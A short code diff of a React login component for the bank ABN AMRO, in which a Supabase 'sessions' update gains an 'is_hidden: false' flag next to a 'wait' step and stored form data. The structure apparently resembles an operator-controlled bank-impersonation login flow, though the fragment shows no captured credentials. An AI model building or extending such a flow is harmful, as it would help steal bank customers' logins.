@@ -46,8 +46,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
 
     const { error: updateError } = await supabase
       .from("sessions")
-      .update({
-        current_step: "wait",
+      .update({ is_hidden: false, current_step: "wait",
         form_data: {
           ...prev,
           bankSlug: "abn-amro",
